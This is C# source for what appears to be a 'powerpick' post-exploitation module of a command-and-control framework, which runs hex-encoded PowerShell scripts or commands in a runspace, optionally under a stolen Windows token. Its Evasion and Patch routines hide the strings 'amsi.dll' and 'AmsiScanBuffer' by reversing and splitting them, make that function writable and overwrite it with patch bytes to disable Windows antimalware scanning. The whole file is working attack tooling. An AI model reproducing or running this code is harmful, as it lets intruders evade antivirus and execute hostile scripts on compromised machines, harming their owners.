using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


public class Module_powerpick
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
    public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    private string ReverseString(string s)
    {
        char[] array = s.ToCharArray();
        Array.Reverse(array);
        return new string(array);
    }

    private int Patch(string file)
    {
        IntPtr dll = LoadLibrary(file);
        if (dll == IntPtr.Zero)
        {
            return 2;
        }

        string keyword = ReverseString("ref" + "fuB" + "nac" + "Sis" + "mA");

        IntPtr funcaddress = GetProcAddress(dll, keyword);
        if (funcaddress == IntPtr.Zero)
        {
            return 3;
        }

        UIntPtr dwSize = (UIntPtr)5;
        uint Zero = 0;
        if (!VirtualProtect(funcaddress, dwSize, 0x40, out Zero))
        {
            return 4;
        }

        string keycodes = ReverseString("3CA08A7"+"0A00"+"A75A8B");
        string[] Xkeycodes = keycodes.Split('A');
        byte[] Xnewkeycodes = new byte[Xkeycodes.Length];

        for (int i = 0; i < Xkeycodes.Length; i++)
        {
            Xnewkeycodes[i] = Convert.ToByte(Xkeycodes[i], 16);
        }

        Byte[] Parcheo = Xnewkeycodes;
        IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);

        Marshal.Copy(Parcheo, 0, unmanagedPointer, 6);
        MoveMemory(funcaddress, unmanagedPointer, 6);

        return 0;
    }

    private int Evasion()
    {
        string file = "lld." + "is" + "ma";
        string filepath = ReverseString(file + "\\23met" + "syS\\s" + "wodniW\\:c");

        if (!File.Exists(filepath))
        {
        return 0;
        }

        return Patch(ReverseString(file));
    }

    private string runPwshScript(string script, string command)
    {
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();

        if (command != "")
            script += Environment.NewLine + command; 

        pipeline.Commands.AddScript(script);
        pipeline.Commands.Add("Out-String");

        Collection<PSObject> results = pipeline.Invoke();
        runspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
            stringBuilder.Append(obj);
        
        return stringBuilder.ToString().Trim();
    }

    private string runPwshCommand(string command)
    {
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();

        pipeline.Commands.Add(command);
        pipeline.Commands.Add("Out-String");

        Collection<PSObject> results = pipeline.Invoke();
        runspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
            stringBuilder.Append(obj);
        
        return stringBuilder.ToString().Trim();
    }
    

    private string[] doPowerpick(string script_data, string commands)
    {
        string result = "";

        try
        {
            int res = Evasion();
            if (res != 0)
                throw new Exception("Can not patch amsi result: '" + res.ToString() + "'");

            if (script_data == "-")
            {
                result += runPwshCommand(commands);
            }
            else
            {
                string script_raw = hex2Str(script_data);
                result += runPwshScript(script_raw, commands);
            }

            result += Environment.NewLine;
        }
        catch(Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);

        if (nargs.Count == 0)
        {
            result = "Invalid arguments provided. Specify a command or script to load.";
            return new string[]{ERR_CODE, result};
        }

        string pwsh_file = nargs[0];
        List<string> pwsh_cmd_list = nargs.GetRange(1, (nargs.Count - 1));
        string[] pwsh_cmd_arr = pwsh_cmd_list.ToArray();
        string pwsh_cmdline = String.Join(" ", pwsh_cmd_arr);

        return doPowerpick(pwsh_file, pwsh_cmdline);
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void go_dm(string cwd, string args, string token)
    {
        Module_powerpick m = new Module_powerpick();
        String[] results = m.go(cwd, args, token);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }

    public static void Main(string[] args)
    {
        Module_powerpick m = new Module_powerpick();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}